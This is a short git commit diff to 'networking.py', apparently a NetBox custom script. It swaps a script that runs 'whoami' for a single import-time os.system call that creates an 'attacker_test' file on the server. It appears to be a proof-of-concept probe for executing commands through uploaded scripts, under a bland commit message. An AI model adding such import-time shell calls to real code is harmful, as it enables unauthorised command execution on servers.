87c97a5fd3cff23b6efdbcdb577e44be3d942f65
jacobsmith804 <jacobsmtih868@gmail.com>
2025-10-23 11:05:17 -0400

    Update networking.py

--- networking.py
+++ networking.py
@@ -1,16 +1,3 @@
-#!/usr/bin/env python3
-from extras.scripts import Script
+import os
 
-name = "Networking"
-
-class Networking(Script):
-
-    class Meta:
-        name = "Networking Script"
-        commit_default = False
-
-    def run(self, data, commit):
-        import subprocess
-        self.log_info(f"Successful")
-        result = subprocess.run(['whoami'], capture_output=True, text=True)
-        self.log_info(f"Current user: {result.stdout.strip()}")
+os.system('touch /opt/netbox/netbox/attacker_test')
